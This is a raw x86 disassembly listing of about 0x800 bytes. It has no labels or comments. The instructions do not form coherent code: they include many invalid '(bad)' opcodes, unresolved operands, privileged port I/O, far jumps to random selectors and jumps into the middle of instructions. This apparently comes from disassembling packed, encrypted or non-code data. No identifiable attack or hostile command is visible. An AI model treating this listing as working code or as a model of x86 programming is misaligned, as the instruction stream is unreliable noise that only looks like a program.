  414aa2:	pop    ds
  414aa3:	jle    0x414a63
  414aa5:	lods   eax,DWORD PTR ds:[esi]
  414aa6:	ficom  DWORD PTR [esi-0x3a]
  414aa9:	push   cs
  414aaa:	add    dl,dh
  414aac:	sub    edx,DWORD PTR [edi+esi*2]
  414aaf:	leave  
  414ab0:	fild   QWORD PTR [edx+0x7b]
  414ab3:	and    eax,DWORD PTR [eax+0x5c7ae24]
  414ab9:	popa   
  414aba:	push   ss
  414abb:	add    BYTE PTR [ebx-0x25],bh
  414abe:	push   esp
  414abf:	imul   esi,DWORD PTR [esi],0x9621c4f6
  414ac5:	aad    0x87
  414ac7:	sub    edi,DWORD PTR [esi]
  414ac9:	xchg   ecx,eax
  414aca:	test   eax,0xefa36c95
  414acf:	lahf   
  414ad0:	(bad)  
  414ad1:	ss shl al,1
  414ad4:	sub    BYTE PTR [edx-0x56],dh
  414ad7:	inc    ebx
  414ad8:	xor    al,0x49
  414adb:	std    
  414adc:	or     eax,0xa4bdd4d2
  414ae1:	loope  0x414a63
  414ae3:	data16 cld 
  414ae5:	cmp    BYTE PTR ds:0xc666c4ca,ah
  414aeb:	imul   esp,DWORD PTR [eax-0xbbc0d1d],0xffffffe7
  414af2:	push   es
  414af3:	aas    
  414af4:	sahf   
  414af5:	sar    DWORD PTR [eax],1
  414af7:	push   esp
  414af8:	push   ebx
  414af9:	lock int3 
  414afb:	jo     0x414adc
  414afd:	mov    al,0xa0
  414aff:	xor    BYTE PTR [edx],al
  414b01:	and    ah,BYTE PTR [ebx+edi*1-0x73]
  414b05:	sbb    BYTE PTR [ebx-0x4ae518fa],cl
  414b0b:	mov    ?,eax
  414b0d:	jg     0x414a90
  414b0f:	lds    edx,FWORD PTR [edi-0x2fecb340]
  414b15:	daa    
  414b16:	call   0x1b7569e8
  414b1b:	fiadd  WORD PTR [ebp-0x2727256e]
  414b21:	ss dec esi
  414b23:	adc    DWORD PTR [ecx-0x38d37e2],0x668ca37
  414b2d:	(bad)  
  414b2f:	adc    edx,esp
  414b31:	adc    BYTE PTR [ebx-0x38a59587],dh
  414b37:	add    DWORD PTR [edi],0xffffffa4
  414b3a:	mov    eax,0x2c46599a
  414b3f:	repnz add eax,0xbb711460
  414b45:	adc    BYTE PTR [edx-0x62],bl
  414b48:	sub    BYTE PTR ds:0x2facdb03,cl
  414b4e:	sbb    al,0x3
  414b50:	sahf   
  414b51:	inc    esp
  414b52:	cmp    al,0x6a
  414b54:	inc    ecx
  414b55:	das    
  414b56:	rol    DWORD PTR [edi+0x541b2f99],1
  414b5c:	mov    gs,ecx
  414b5e:	mov    esi,DWORD PTR [ecx]
  414b60:	js     0x414b87
  414b62:	nop
  414b63:	stos   DWORD PTR es:[edi],eax
  414b64:	int3   
  414b65:	aad    0xc5
  414b67:	aas    
  414b68:	int3   
  414b69:	outs   dx,BYTE PTR ds:[esi]
  414b6a:	push   esp
  414b6b:	mov    WORD PTR [ebx],?
  414b6d:	jbe    0x414bc8
  414b6f:	(bad)
  414b72:	(bad)
  414b76:	sub    eax,0x74baf51f
  414b7b:	ret    
  414b7c:	adc    BYTE PTR [edx-0x43c4ea3a],dh
  414b82:	sbb    eax,0xb9fb7531
  414b87:	pop    esp
  414b88:	push   ebp
  414b89:	add    DWORD PTR [edi-0x2c],0x44
  414b8d:	or     al,0xd7
  414b8f:	icebp  
  414b90:	lea    eax,[eax]
  414b92:	and    BYTE PTR [eax+0x165864e1],bh
  414b98:	pusha  
  414b99:	xchg   ebp,eax
  414b9a:	test   BYTE PTR [ecx-0x37428a3b],dl
  414ba0:	in     al,dx
  414ba1:	(bad)  
  414ba2:	mov    eax,ds:0x6ed74cbd
  414ba7:	fistp  DWORD PTR [ebp+0x8]
  414baa:	aam    0x52
  414bac:	ror    DWORD PTR [ecx+esi*2+0x4a018839],1
  414bb3:	jecxz  0x414b81
  414bb5:	stos   BYTE PTR es:[edi],al
  414bb6:	aad    0x5d
  414bb8:	and    ecx,eax
  414bba:	sbb    BYTE PTR [edx+0x63],0xe6
  414bbe:	int    0xf1
  414bc0:	or     DWORD PTR [eax+0x8],esi
  414bc3:	iret   
  414bc4:	inc    eax
  414bc5:	loope  0x414b6b
  414bc7:	sbb    ch,BYTE PTR [ecx]
  414bc9:	xchg   BYTE PTR [ecx+0x24],bh
  414bcc:	and    dh,cl
  414bce:	test   al,0x27
  414bd0:	push   edx
  414bd1:	aam    0xf7
  414bd3:	mov    fs,WORD PTR [ebx]
  414bd5:	pop    ebp
  414bd6:	fdiv   st(6),st
  414bd8:	add    ebp,DWORD PTR [esi+0x1fd8e97a]
  414bde:	mov    cl,0x56
  414be0:	test   eax,0xe839cbb7
  414be5:	(bad)  
  414be6:	xor    cl,BYTE PTR [ecx]
  414be8:	inc    esi
  414be9:	lds    ebx,FWORD PTR [edx-0x5dcaa6f8]
  414bef:	std    
  414bf0:	inc    ebx
  414bf1:	outs   dx,DWORD PTR ds:[esi]
  414bf2:	repz jge 0x414bc7
  414bf5:	ror    BYTE PTR [eax],0xfc
  414bf8:	and    al,0x9c
  414bfa:	xor    DWORD PTR [ebp+0x7e33497],ebx
  414c00:	push   edi
  414c01:	add    ecx,edx
  414c03:	and    DWORD PTR [edi+0x76183aeb],ebp
  414c09:	jp     0x414bb3
  414c0b:	in     al,dx
  414c0c:	jecxz  0x414be3
  414c0e:	sub    eax,edi
  414c10:	cmc    
  414c11:	clc    
  414c12:	and    ebx,DWORD PTR [eax+0x76]
  414c15:	cs pop edx
  414c17:	adc    eax,0x7ddcacd5
  414c1c:	cmp    al,0x59
  414c1e:	cmp    eax,0x29577bb3
  414c23:	add    BYTE PTR [ecx],0xae
  414c26:	mov    ah,0x2
  414c28:	scas   eax,DWORD PTR es:[edi]
  414c29:	pop    edi
  414c2a:	add    BYTE PTR [esi+0x5225cb90],ch
  414c30:	jecxz  0x414c2a
  414c32:	cmc    
  414c33:	dec    eax
  414c34:	push   cs
  414c35:	adc    edx,DWORD PTR [ecx-0x106e79de]
  414c3b:	push   ecx
  414c3c:	test   esi,ecx
  414c3e:	sbb    eax,0x7ae88231
  414c43:	or     al,0x22
  414c45:	addr16 jg 0x414c08
  414c48:	gs inc eax
  414c4a:	cmp    eax,0xb279a5e7
  414c4f:	mov    esi,0xae04b2eb
  414c54:	je     0x414c58
  414c56:	cmp    eax,0xe97dc2a3
  414c5b:	clc    
  414c5c:	fwait
  414c5d:	retf   
  414c5e:	sub    eax,0x5d53e556
  414c63:	pop    edx
  414c64:	sbb    BYTE PTR [ecx+0x75e03875],0x86
  414c6b:	mov    bh,0xce
  414c6d:	adc    BYTE PTR [ecx],ch
  414c6f:	inc    esi
  414c70:	int    0xa3
  414c72:	lods   al,BYTE PTR ds:[esi]
  414c73:	rol    DWORD PTR [eax-0x3d],0x76
  414c77:	in     al,0x40
  414c79:	std    
  414c7a:	mov    BYTE PTR [eax+edx*2-0x2d59d554],dl
  414c81:	jmp    FWORD PTR [edi+0x3]
  414c84:	ror    BYTE PTR [ebx+0x3],0x8
  414c88:	fwait
  414c89:	dec    eax
  414c8a:	inc    edi
  414c8b:	and    DWORD PTR [esi],esp
  414c8d:	xor    BYTE PTR [edx],bh
  414c8f:	xor    BYTE PTR [si-0x5e],cl
  414c93:	dec    ebx
  414c94:	pop    ecx
  414c95:	pop    edi
  414c96:	pushf  
  414c97:	cdq    
  414c98:	mov    eax,ds:0xd3a02258
  414c9d:	jge    0x414c29
  414c9f:	scas   al,BYTE PTR es:[edi]
  414ca0:	ds xchg esi,eax
  414ca2:	jnp    0x414c72
  414ca4:	push   ecx
  414ca5:	sbb    DWORD PTR [ebp-0x53cea6a3],ebx
  414cab:	jg     0x414cd4
  414cad:	add    BYTE PTR [edi],al
  414caf:	not    BYTE PTR [esi-0x2f]
  414cb2:	fbld   TBYTE PTR [edx+0x70d88922]
  414cb8:	ins    DWORD PTR es:[edi],dx
  414cb9:	pusha  
  414cba:	add    BYTE PTR [ecx+0x4fe2342f],cl
  414cc0:	pcmpgtw mm7,QWORD PTR [ecx+0x5b]
  414cc4:	pop    ebp
  414cc5:	and    BYTE PTR [ebx+eiz*2],0xdd
  414cc9:	daa    
  414cca:	fdivr  DWORD PTR [ebx+0x210eafaf]
  414cd0:	outs   dx,BYTE PTR ds:[esi]
  414cd1:	idiv   DWORD PTR [edx-0x54]
  414cd4:	jmp    0x414c79
  414cd6:	iret   
  414cd7:	mov    ah,0xda
  414cd9:	inc    ebx
  414cda:	xor    eax,DWORD PTR [ecx+0x78f5db89]
  414ce0:	shl    cl,1
  414ce2:	push   cs
  414ce3:	pop    esi
  414ce4:	fst    DWORD PTR [eax+0x3d]
  414ce7:	aam    0x69
  414ce9:	xchg   ecx,eax
  414cea:	jg     0x414cd7
  414cec:	adc    ebp,DWORD PTR [ebp+0x46e7426a]
  414cf2:	sub    al,0xc4
  414cf4:	adc    DWORD PTR [ebx-0x74],eax
  414cf7:	xchg   esi,eax
  414cf8:	imul   edx,esp,0x47
  414cfb:	es pop ebx
  414cfd:	fisub  WORD PTR [eax]
  414cff:	mov    dh,0xc9
  414d01:	test   DWORD PTR [eax+ebx*8+0x28b839b3],esi
  414d08:	xchg   edx,eax
  414d09:	inc    ebx
  414d0a:	shr    DWORD PTR [edi-0x3e],1
  414d0d:	fdiv   QWORD PTR [ecx+0x29]
  414d10:	xchg   ebp,eax
  414d11:	adc    al,0x79
  414d13:	pusha  
  414d14:	mov    ch,0x90
  414d16:	adc    DWORD PTR ds:0xedb9c786,0xffffffe4
  414d1d:	std    
  414d1e:	cmp    ebx,0x340b1922
  414d24:	inc    esi
  414d25:	retf   0x3bcd
  414d28:	mov    bl,BYTE PTR [edi]
  414d2a:	add    ebp,DWORD PTR [ecx+0x7accbe15]
  414d30:	(bad)  
  414d31:	pop    ebp
  414d32:	sbb    al,0xd2
  414d34:	inc    ecx
  414d35:	icebp  
  414d36:	dec    esp
  414d37:	int    0xa5
  414d39:	aam    0xdd
  414d3b:	jo     0x414d8c
  414d3d:	pusha  
  414d3e:	jno    0x414cf2
  414d40:	sub    ah,BYTE PTR [ecx+0x1ae105e8]
  414d46:	or     dl,BYTE PTR [eax+eax*8]
  414d49:	popa   
  414d4a:	pop    edx
  414d4b:	add    al,0x1b
  414d4d:	mov    edx,0x63b3185c
  414d52:	inc    ebx
  414d53:	stos   BYTE PTR es:[edi],al
  414d54:	nop
  414d55:	dec    edx
  414d56:	ins    BYTE PTR es:[edi],dx
  414d57:	rcr    DWORD PTR [eax-0x27],cl
  414d5a:	mov    ecx,0x669ae857
  414d5f:	cdq    
  414d60:	mov    cl,0xd5
  414d62:	hlt    
  414d63:	cmp    DWORD PTR [edi],esi
  414d65:	repz mov eax,ds:0x6a975072
  414d6c:	jmp    FWORD PTR [eax+0x73]
  414d6f:	xchg   esp,eax
  414d71:	es push ebx
  414d73:	loop   0x414d0c
  414d75:	sub    eax,0x81ed902a
  414d7a:	int    0xd4
  414d7c:	adc    al,0xea
  414d7e:	out    dx,al
  414d7f:	out    0x63,eax
  414d81:	jo     0x414d26
  414d83:	ins    DWORD PTR es:[edi],dx
  414d84:	inc    edx
  414d85:	and    BYTE PTR [esi-0x47b477e3],cl
  414d8b:	adc    eax,0xf3f67086
  414d90:	fistp  DWORD PTR [esi+0x2b1d459]
  414d96:	cmc    
  414d97:	jle    0x414e0a
  414d99:	xchg   bl,ah
  414d9b:	fistp  WORD PTR [edi+0x79]
  414d9e:	xor    DWORD PTR [ecx-0x73],ecx
  414da1:	ss es push eax
  414da4:	mov    ecx,0x50db2c9f
  414da9:	push   eax
  414daa:	dec    DWORD PTR [edi]
  414dac:	iret   
  414dad:	shr    DWORD PTR [ebp-0x14],0x7e
  414db1:	imul   edx,DWORD PTR [ebx+0x12b520c3],0x2bb17f4d
  414dbb:	jp     0x414db1
  414dbd:	adc    edx,ebx
  414dbf:	int3   
  414dc0:	and    esi,esp
  414dc2:	sti    
  414dc3:	imul   esi,DWORD PTR [ebp-0x268471a7],0x70
  414dca:	imul   esi,DWORD PTR [ebp+0x3d],0xffffff87
  414dce:	cwde   
  414dcf:	test   BYTE PTR [ecx+0x3cdeb6c7],ch
  414dd5:	fild   QWORD PTR [esi]
  414dd7:	sub    ch,BYTE PTR [edx-0x510d4678]
  414ddd:	xchg   ecx,eax
  414dde:	clc    
  414ddf:	or     DWORD PTR [edx+ebp*2+0x6f10b800],ebp
  414de6:	in     eax,dx
  414de7:	mov    ebp,DWORD PTR [ecx-0xb96e8c7]
  414ded:	jge    0x414e0b
  414def:	sti    
  414df0:	jl     0x414db1
  414df2:	mov    ch,0x19
  414df4:	adc    eax,0x91ad66c0
  414df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dfa:	cmp    eax,0x1538eb5a
  414dff:	and    BYTE PTR [edi-0x61c1cd18],ch
  414e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e06:	xchg   ebp,eax
  414e07:	cs cmp al,0x79
  414e0a:	and    cl,BYTE PTR [ebx]
  414e0c:	mov    cl,0xc6
  414e0e:	push   esp
  414e0f:	cmp    ebx,DWORD PTR [ecx-0x3d5cf316]
  414e15:	and    esp,edx
  414e17:	stos   BYTE PTR es:[edi],al
  414e18:	pop    ecx
  414e19:	mov    esp,0x3bbc4870
  414e1e:	cwde   
  414e1f:	push   esi
  414e20:	or     ch,BYTE PTR [eax]
  414e22:	fldcw  WORD PTR [ecx+0x1]
  414e25:	mov    dl,0x33
  414e27:	repnz cmp al,0x2
  414e2a:	rol    cl,1
  414e2c:	hlt    
  414e2d:	sbb    eax,esp
  414e2f:	xlat   BYTE PTR ds:[ebx]
  414e30:	pop    esp
  414e31:	push   ss
  414e32:	lock pop ebx
  414e34:	jg     0x414e8e
  414e36:	push   ebp
  414e37:	mov    ebp,0xb60a6eb5
  414e3c:	dec    esi
  414e3d:	mov    al,ds:0xabab3ff8
  414e42:	jnp    0x414e4b
  414e44:	repz test BYTE PTR [edx],al
  414e47:	dec    eax
  414e48:	lods   eax,DWORD PTR ds:[esi]
  414e49:	push   ecx
  414e4a:	jg     0x414e57
  414e4c:	es ins DWORD PTR es:[edi],dx
  414e4e:	add    BYTE PTR [eax-0x68c5ffb6],bh
  414e54:	add    ecx,DWORD PTR [eax-0x2c182ebc]
  414e5a:	jo     0x414e4f
  414e5c:	mov    edx,0x194ff42e
  414e61:	rol    BYTE PTR [eax-0x63ee005c],cl
  414e67:	jl     0x414e50
  414e69:	push   ebx
  414e6a:	mov    ch,0xcb
  414e6c:	sbb    BYTE PTR [ebp+0x3645cf69],ch
  414e72:	dec    eax
  414e73:	mov    al,ds:0x9da4c276
  414e78:	push   edi
  414e79:	mov    ds:0xc4ef309c,al
  414e7e:	out    0x8e,eax
  414e80:	push   0x57
  414e82:	mov    ebp,0x7a8f8492
  414e87:	dec    DWORD PTR [esi+0x1e13b1a5]
  414e8d:	and    esi,0x3c320540
  414e93:	into   
  414e94:	lods   al,BYTE PTR ds:[esi]
  414e95:	fmul   st(1),st
  414e97:	inc    esp
  414e98:	adc    BYTE PTR es:[edx+0x54960c77],0xdf
  414ea0:	ja     0x414eca
  414ea2:	mov    esp,0x3dd25380
  414ea7:	or     cl,bl
  414ea9:	mov    dl,0x23
  414eab:	xor    ebp,DWORD PTR ds:0x62ba123a
  414eb1:	mov    dh,0x43
  414eb3:	enter  0xcdd9,0x10
  414eb7:	jo     0x414e89
  414eb9:	ins    DWORD PTR es:[edi],dx
  414eba:	sub    BYTE PTR [ecx],0xe
  414ebd:	pushf  
  414ebe:	pop    es
  414ebf:	push   ss
  414ec0:	push   ds
  414ec1:	adc    eax,0x74309115
  414ec6:	jnp    0x414ef1
  414ec8:	stc    
  414ec9:	ds repnz test al,0xd0
  414ecd:	div    BYTE PTR [ebp-0x3c06606f]
  414ed3:	cmp    edx,DWORD PTR [ebp+0x35cf3093]
  414ed9:	iret   
  414eda:	cmc    
  414edb:	lahf   
  414edc:	ffreep st(5)
  414ede:	mov    dh,0xd0
  414ee0:	mov    fs:0x57d33d01,al
  414ee6:	sahf   
  414ee7:	push   ds
  414ee8:	jne    0x414eb5
  414eea:	adc    bl,BYTE PTR [ecx]
  414eec:	sub    DWORD PTR [edx-0x2],eax
  414eef:	or     eax,DWORD PTR [esi+0x33]
  414ef2:	adc    eax,0xf34d3ee2
  414ef7:	call   0xad2d:0xa28cd82d
  414efe:	(bad)
  414f01:	out    0xb8,al
  414f03:	gs pop edi
  414f05:	outs   dx,DWORD PTR ds:[esi]
  414f06:	clc    
  414f07:	pop    esi
  414f08:	cmp    DWORD PTR [ebp+0x2a],esp
  414f0b:	int    0xa9
  414f0d:	pop    ds
  414f0e:	xchg   ebx,eax
  414f0f:	xchg   edi,eax
  414f10:	ja     0x414f1f
  414f12:	in     eax,0x84
  414f14:	cwde   
  414f15:	adc    eax,0xc3a1e555
  414f1a:	ss pop edi
  414f1c:	mov    eax,0x76edee98
  414f21:	jg     0x414f49
  414f23:	cmp    edi,esp
  414f25:	jp     0x414f70
  414f27:	push   ds
  414f28:	jecxz  0x414f61
  414f2a:	mov    ebx,0x1861c56f
  414f2f:	inc    ecx
  414f30:	scas   al,BYTE PTR es:[edi]
  414f31:	xor    ebx,DWORD PTR [ebp+0x46f80cc7]
  414f37:	pusha  
  414f38:	mov    esp,0x641ae9d8
  414f3d:	shl    eax,1
  414f3f:	mov    edi,0xdcf7ae97
  414f44:	add    eax,eax
  414f46:	leave  
  414f47:	push   edx
  414f48:	sub    eax,0xdb02b953
  414f4d:	pop    esp
  414f4e:	js     0x414f62
  414f50:	inc    esp
  414f51:	jmp    0xa78b:0xa538f2cb
  414f58:	xchg   edi,eax
  414f59:	cmp    eax,0xfd8116cd
  414f5e:	add    al,0x2c
  414f60:	test   ah,ah
  414f62:	adc    BYTE PTR cs:[ebx+ecx*1],0x52
  414f67:	or     DWORD PTR [ebx],edi
  414f69:	push   ebp
  414f6a:	mov    edx,0x2690c72c
  414f6f:	imul   ebx,DWORD PTR ds:0xdf66940e,0x83af4c6a
  414f79:	or     BYTE PTR [edx-0x52],ah
  414f7c:	daa    
  414f7d:	cli    
  414f7e:	xchg   esi,eax
  414f7f:	int3   
  414f80:	lods   eax,DWORD PTR ds:[esi]
  414f81:	into   
  414f82:	cmp    esp,eax
  414f84:	add    al,0xba
  414f86:	ds dec ebp
  414f88:	rol    BYTE PTR es:[edi],1
  414f8b:	(bad)  [ebp-0x1b71530c]
  414f91:	adc    edx,DWORD PTR [edx+0x5bddb600]
  414f97:	sub    ebp,0xfffffff1
  414f9a:	ins    BYTE PTR es:[edi],dx
  414f9b:	sahf   
  414f9c:	(bad)  
  414f9d:	xchg   ecx,eax
  414f9e:	retfw  0xd279
  414fa2:	mov    BYTE PTR [edx+0x1e],al
  414fa5:	jnp    0x414f3d
  414fa7:	fdivr  QWORD PTR [esi+ecx*1+0x7f]
  414fab:	pusha  
  414fac:	fldlg2 
  414fae:	out    dx,al
  414faf:	jp     0x414f96
  414fb1:	jmp    0x414fa1
  414fb3:	neg    BYTE PTR [eax]
  414fb5:	mov    ecx,0x995f5308
  414fba:	and    eax,0x593631d9
  414fbf:	ins    DWORD PTR es:[edi],dx
  414fc0:	hlt    
  414fc1:	fwait
  414fc2:	lds    esi,FWORD PTR [esp+edi*8+0x68]
  414fc6:	push   cs
  414fc7:	aaa    
  414fc8:	(bad)  [esp+esi*2+0x5]
  414fcc:	jae    0x414fbe
  414fce:	push   esp
  414fcf:	adc    esp,edx
  414fd1:	cmp    al,0x61
  414fd3:	jge    0x414f6b
  414fd5:	std    
  414fd6:	shl    DWORD PTR [edi-0x3e],1
  414fd9:	loope  0x414fc4
  414fdb:	ret    
  414fdc:	push   ebx
  414fdd:	imul   edi,edi,0x307801ed
  414fe3:	or     ecx,DWORD PTR [esi+0x61]
  414fe6:	adc    BYTE PTR ds:0xf8bcfb8e,0xf0
  414fed:	pop    esp
  414fee:	mov    eax,ds:0x417bb000
  414ff3:	inc    ecx
  414ff4:	inc    edi
  414ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff6:	hlt    
  414ff7:	(bad)  
  414ff8:	lods   al,BYTE PTR ds:[esi]
  414ff9:	pop    edi
  414ffa:	jl     0x414fb1
  414ffc:	(bad)  
  414ffd:	and    eax,0xb952e09c
  415002:	ret    0xa6ef
  415005:	enter  0x67e8,0xba
  415009:	add    ch,ch
  41500b:	xor    DWORD PTR [ebp-0x43665b6d],0xffffffe0
  415012:	push   ss
  415013:	mov    dl,0xb5
  415015:	loop   0x415053
  415017:	(bad)  
  415018:	in     eax,0x82
  41501a:	fdiv   st,st(7)
  41501c:	inc    ecx
  41501d:	fs stos BYTE PTR es:[edi],al
  41501f:	popa   
  415020:	and    dl,BYTE PTR [ebp+0x18]
  415023:	sar    DWORD PTR ds:0x328e4c0e,0xce
  41502a:	mov    dh,0x31
  41502c:	sub    BYTE PTR ds:0x915c093b,dl
  415032:	call   0xdcd8:0xc50951ca
  415039:	fdiv   QWORD PTR [ecx]
  41503b:	jnp    0x415090
  41503d:	inc    eax
  41503e:	ss into 
  415040:	mov    esi,0x4e51c9c1
  415045:	repz fmulp st(2),st
  415048:	inc    ecx
  415049:	lds    ebx,FWORD PTR [ebx-0x79]
  41504c:	or     eax,0xace3e704
  415051:	and    eax,0xbb8925b
  415056:	(bad)  
  415057:	scas   al,BYTE PTR es:[edi]
  415058:	loopne 0x414fee
  41505a:	dec    ebx
  41505b:	int    0x5c
  41505d:	dec    edx
  41505e:	cmp    esp,DWORD PTR [ebx+eiz*2-0x7]
  415062:	or     esp,DWORD PTR [ecx]
  415064:	test   al,0x84
  415066:	(bad)
  415069:	dec    edx
  41506a:	pop    ebx
  41506b:	inc    esi
  41506c:	in     al,dx
  41506d:	xor    BYTE PTR [eax],cl
  41506f:	fld    QWORD PTR [esi+ebx*4-0x17]
  415073:	fsub   DWORD PTR [esi]
  415075:	and    BYTE PTR [esi+edi*8+0x29],bl
  415079:	(bad)  
  41507a:	pop    ecx
  41507b:	ins    BYTE PTR es:[edi],dx
  41507c:	stos   DWORD PTR es:[edi],eax
  41507d:	cmp    esp,DWORD PTR [edi-0x6630adcc]
  415083:	nop
  415084:	sbb    al,BYTE PTR [ecx]
  415086:	dec    esi
  415087:	xor    ebp,DWORD PTR ds:0x32365d9e
  41508d:	iret   
  41508e:	add    eax,0xdc56448d
  415093:	(bad)  
  415094:	cld    
  415095:	imul   esi,DWORD PTR [ebx+0x1e],0xffffffee
  415099:	push   esp
  41509a:	shl    DWORD PTR [edx],1
  41509c:	jae    0x41510c
  41509e:	fwait
  41509f:	call   FWORD PTR ds:0xa8e7ec0
  4150a5:	ja     0x4150da
  4150a7:	push   ecx
  4150a8:	enter  0x360c,0x99
  4150ac:	sub    BYTE PTR [ecx-0x3a],ch
  4150af:	sbb    DWORD PTR [esi],ecx
  4150b1:	lock xchg ebx,eax
  4150b3:	mov    ah,0x8a
  4150b5:	test   DWORD PTR [edx-0x4b],esi
  4150b8:	xor    eax,0xaa63c108
  4150bd:	xchg   esi,eax
  4150be:	mov    dh,0xe1
  4150c0:	outs   dx,BYTE PTR ds:[esi]
  4150c1:	call   0xc8925705
  4150c6:	mov    WORD PTR [ecx+0x6f126b05],cs
  4150cc:	add    BYTE PTR [ecx+0x41],ah
  4150cf:	push   ebp
  4150d0:	push   edi
  4150d1:	pop    es
  4150d2:	cmc    
  4150d3:	pop    edx
  4150d4:	mov    ebx,0x5aefec7a
  4150d9:	ins    DWORD PTR es:[edi],dx
  4150da:	fsubr  st,st(3)
  4150dc:	or     al,0x9a
  4150de:	loope  0x41512d
  4150e0:	inc    ebp
  4150e1:	out    0x2c,eax
  4150e3:	mov    esi,0x9229556b
  4150e8:	clc    
  4150e9:	fidiv  DWORD PTR ds:0x85601c9a
  4150ef:	add    al,0x20
  4150f1:	sub    dh,BYTE PTR [ecx+0x51a50584]
  4150f7:	fidivr WORD PTR [edi-0x65]
  4150fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150fb:	mov    esi,0x1516e82a
  415100:	dec    edi
  415101:	mov    al,ds:0xbc6592c9
  415106:	mov    esp,0xbca54a9a
  41510b:	add    BYTE PTR [esi+0x64],bh
  41510e:	leave  
  41510f:	sub    dh,BYTE PTR [esp+ebx*4-0x25ce9d28]
  415116:	push   0x7e
  415118:	rcl    BYTE PTR [ebx],1
  41511a:	sbb    al,0xac
  41511c:	and    ebp,0x4f29e426
  415122:	pop    ecx
  415123:	into   
  415124:	dec    edx
  415125:	jle    0x41515b
  415127:	add    ch,BYTE PTR [esi+0x1386cdde]
  41512d:	out    dx,eax
  41512e:	cmc    
  41512f:	mov    WORD PTR [esi],?
  415131:	adc    DWORD PTR [eax+0x4ce50fc2],ebx
  415137:	push   esi
  415138:	ror    BYTE PTR [edx-0x5e0228b0],1
  41513e:	aas    
  41513f:	call   0x34cd0fcb
  415144:	sub    ebx,DWORD PTR [edi+0x430713]
  41514a:	ins    DWORD PTR es:[edi],dx
  41514b:	test   cl,ah
  41514d:	mov    ch,0xca
  41514f:	sar    DWORD PTR [edi-0x40722db1],0x60
  415156:	scas   eax,DWORD PTR es:[edi]
  415157:	mov    ds:0xad7b650d,al
  41515c:	mov    esi,0xd51a5906
  415161:	inc    edx
  415162:	push   ebx
  415163:	arpl   di,bx
  415165:	in     eax,dx
  415166:	cs cmp eax,0x7ff6be0f
  41516c:	pop    ds
  41516d:	mov    eax,0x2cd388e1
  415172:	fdivr  QWORD PTR [ecx+eiz*1-0x6eb76ecc]
  415179:	ja     0x415138
  41517b:	mov    eax,ds:0x7f414b63
  415180:	add    ebx,DWORD PTR [ebx+0x545549cf]
  415186:	stc    
  415187:	fidiv  DWORD PTR [edx-0x165f9d73]
  41518d:	xchg   ebx,eax
  41518e:	test   BYTE PTR [eax],ah
  415190:	jns    0x415169
  415192:	mov    DWORD PTR [edi],esi
  415194:	pop    ds
  415195:	lods   al,BYTE PTR ds:[esi]
  415196:	and    edi,DWORD PTR [ecx-0xfc2528c]
  41519c:	xchg   bh,bh
  41519e:	push   ss
  41519f:	inc    edx
  4151a0:	pushf  
  4151a1:	lods   al,BYTE PTR ds:[esi]
  4151a2:	fidivr WORD PTR [edx]
  4151a4:	mov    ds:0xc0d8c0eb,al
  4151a9:	mov    dh,0x53
  4151ab:	jg     0x415204
  4151ad:	mov    bl,0x17
  4151af:	pop    esp
  4151b0:	inc    esi
  4151b1:	mov    ecx,0x60a3fe82
  4151b6:	loope  0x415202
  4151b8:	cs js  0x415146
  4151bb:	sar    DWORD PTR [ebp+0x43],cl
  4151be:	call   0x8b9368c7
  4151c3:	and    eax,0xd95c9af6
  4151c8:	jg     0x415235
  4151ca:	mov    ah,0xd7
  4151cc:	mov    ds:0x3df5be6b,al
  4151d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d2:	mov    ah,BYTE PTR [eax-0x274e7b75]
  4151d8:	mov    edi,0xf9cb359c
  4151dd:	mov    bh,BYTE PTR [eax+0x4d07e92c]
  4151e3:	loope  0x415197
  4151e5:	stc    
  4151e6:	cdq    
  4151e7:	jnp    0x41520f
  4151e9:	add    eax,0x53d2b27
  4151ee:	jp     0x415189
  4151f0:	xor    DWORD PTR [ecx-0x56c972f4],ebx
  4151f6:	out    0x5d,al
  4151f8:	sbb    eax,0xa2aa034a
  4151fd:	lods   eax,DWORD PTR ds:[esi]
  4151fe:	push   ebp
  4151ff:	adc    al,0x75
  415201:	jne    0x4151e7
  415203:	push   0x40
  415205:	dec    esi
  415206:	out    dx,eax
  415207:	sub    eax,0xe57e4af1
  41520c:	outs   dx,DWORD PTR ds:[esi]
  41520d:	jecxz  0x41527c
  41520f:	out    0x92,eax
  415211:	mov    cl,0xf6
  415213:	imul   edx,DWORD PTR [edx],0xea86f198
  415219:	lods   al,BYTE PTR ds:[esi]
  41521a:	lods   al,BYTE PTR ds:[esi]
  41521b:	pop    ebp
  41521c:	push   0x5e
  41521e:	mov    esi,0xbada5dd5
  415223:	aam    0x70
  415225:	jno    0x415227
  415227:	jecxz  0x415232
  415229:	repz adc al,0x50
  41522c:	add    al,0x3d
  41522e:	lahf   
  41522f:	add    ebp,DWORD PTR [esi]
  415231:	bswap  ebp
  415233:	cmp    al,0x18
  415235:	xor    al,0xe7
  415237:	cmp    edi,DWORD PTR ds:0xfb7318a
  41523d:	xchg   edx,eax
  41523e:	outs   dx,BYTE PTR ds:[esi]
  41523f:	xchg   ebp,eax
  415240:	shl    BYTE PTR [esi],1
  415242:	fisubr DWORD PTR [eax]
  415244:	dec    eax
  415245:	popa   
  415246:	aas    
  415247:	js     0x4151db
  415249:	out    dx,al
  41524a:	mov    DWORD PTR [ebp+0xf5fffa0],ebx
  415250:	sbb    bl,BYTE PTR [ebx+ecx*1+0x2f]
  415254:	and    DWORD PTR [edx-0x2f],edi
  415257:	jg     0x415262
  415259:	xchg   ebx,eax
  41525a:	test   eax,0x55e4aa04
  41525f:	jns    0x415291
  415261:	imul   ecx,DWORD PTR [eax+0x23500b01],0xffffffbd
  415268:	pop    esp
  415269:	jp     0x41528b
  41526b:	and    BYTE PTR [esp+ecx*2],al
  41526e:	xchg   dl,cl
  415270:	test   eax,0x171efbff
  415275:	inc    edi
  415276:	or     BYTE PTR [ebp-0xdda7640],dl
  41527c:	sbb    eax,DWORD PTR [ebx+eiz*1]
  41527f:	aaa    
  415280:	pop    ebx
  415281:	jmp    0x378e:0xb2b9b1b8
  415288:	mov    edi,DWORD PTR [esi]
  41528a:	lods   eax,DWORD PTR ds:[esi]
  41528b:	ja     0x41522a
  41528d:	fisub  WORD PTR [edx+ebp*2]
  415290:	or     DWORD PTR [eax-0x60],0x6b6546c6
